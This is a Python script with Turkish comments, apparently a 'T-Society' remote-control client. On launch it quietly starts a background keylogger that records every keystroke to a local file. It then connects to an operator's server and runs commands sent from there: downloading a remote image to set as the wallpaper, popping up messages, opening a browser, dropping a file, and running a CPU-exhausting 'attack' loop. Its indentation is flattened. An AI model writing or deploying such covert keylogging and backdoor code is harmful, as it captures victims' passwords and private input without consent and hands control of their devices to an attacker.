import socket import threading import os import platform import urllib.request import ctypes from pynput import keyboard

=== GİZLİ SCRIPT: Keylogger ===

def gizli_script(): def on_press(key): try: with open("keylog.txt", "a") as f: f.write(f"{key.char}") except AttributeError: with open("keylog.txt", "a") as f: f.write(f"[{key}]") listener = keyboard.Listener(on_press=on_press) listener.start()

=== CİHAZ TİPİ BELİRLE ===

def cihaz_tipi(): sistem = platform.system() if sistem == "Linux": if "Android" in platform.platform(): return "Telefon" else: return "Linux PC" elif sistem == "Windows": return "Windows PC" elif sistem == "Darwin": return "Mac" return "Bilinmeyen"

=== FONKSİYONLAR ===

def arkaplan_degistir(url): try: urllib.request.urlretrieve(url, "arkaplan.jpg") if cihaz == "Telefon": os.system("termux-wallpaper -f arkaplan.jpg") elif cihaz == "Windows PC": yol = os.path.abspath("arkaplan.jpg") ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3) elif cihaz == "Linux PC": os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg") s.send("[✓] Arka plan degistirildi\n".encode()) except: s.send("[!] Arka plan degistirilemedi\n".encode())

def saka_modu(mesaj): try: if cihaz == "Telefon": os.system(f'termux-notification --title "TSociety" --content "{mesaj}"') elif cihaz == "Windows PC": os.system(f'msg * "{mesaj}"') elif cihaz == "Linux PC": os.system(f'notify-send "TSociety" "{mesaj}"') s.send("[!] Şaka modu mesajı gönderildi!\n".encode()) except: s.send("[!] Şaka mesajı gönderilemedi!\n".encode())

def google_ac(): try: if cihaz == "Telefon": os.system("termux-open-url https://www.google.com") elif cihaz == "Windows PC": os.system("start https://www.google.com") elif cihaz == "Linux PC": os.system("xdg-open https://www.google.com") s.send("[✓] Google acildi\n".encode()) except: s.send("[!] Google acilamadi\n".encode())

def dosya_olustur(): try: with open("saka.txt", "w") as f: f.write("T-Society buradaydı!") s.send("[+] Dosya olusturuldu\n".encode()) except: s.send("[!] Dosya olusturulamadi\n".encode())

def saldiri_yap(): try: for _ in range(9999999): _ = 9 ** 999 s.send("[✓] Cihaz kasarildi\n".encode()) except: s.send("[!] Saldiri hatasi\n".encode())

=== BAĞLANTI ===

cihaz = cihaz_tipi() threading.Thread(target=gizli_script, daemon=True).start()

SERVER_IP = input("Server IP gir: ") PORT = int(input("Port gir: "))

s = socket.socket() try: s.connect((SERVER_IP, PORT)) s.send(f"[+] {cihaz} baglandi.".encode()) except: print("[!] Baglanti hatasi.") exit()

=== KOMUT DÖNGÜSÜ ===

while True: try: komut = s.recv(1024).decode().strip() if komut == "google": google_ac() elif komut == "saldiri": saldiri_yap() elif komut == "dosya": dosya_olustur() elif komut.startswith("arkaplan "): _, url = komut.split(" ", 1) arkaplan_degistir(url) elif komut.startswith("saka "): _, mesaj = komut.split(" ", 1) saka_modu(mesaj) elif komut == "exit": s.close() break else: s.send("[!] Bilinmeyen komut\n".encode()) except: break

